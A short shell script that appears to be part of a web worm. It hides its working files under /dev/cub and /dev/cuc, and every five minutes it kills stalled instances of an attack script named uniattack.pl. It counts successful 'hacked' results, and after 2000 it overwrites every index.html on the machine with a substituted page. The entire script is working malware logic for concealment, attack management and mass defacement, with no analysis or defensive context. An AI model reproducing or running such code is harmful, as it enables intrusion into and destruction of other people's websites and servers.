#!/bin/sh
/bin/ps -ef|/bin/grep uniattack.pl > /dev/cub/tmp1
while true
do
/bin/sleep 300
/bin/ps -ef|/bin/grep uniattack.pl > /dev/cub/tmp2
/bin/awk '{print $2}' /dev/cub/tmp1 > /dev/cub/tmp3
process=`/bin/awk '{print $2}' /dev/cub/tmp2`
for p in $process;do
/bin/grep $p /dev/cub/tmp3
if [ $? = 0 ];then
/bin/kill -9 $p
fi 
done
/bin/cp /dev/cub/tmp2 /dev/cub/tmp1
i=`/bin/grep hacked /dev/cub/result.txt|/bin/wc -l`
if [ $i -gt 2000 ];then
/bin/nohup /bin/find / -name "index.html" -exec /bin/cp /dev/cuc/index.html {} \; &
/bin/rm -f /dev/cub/result.txt
fi
done
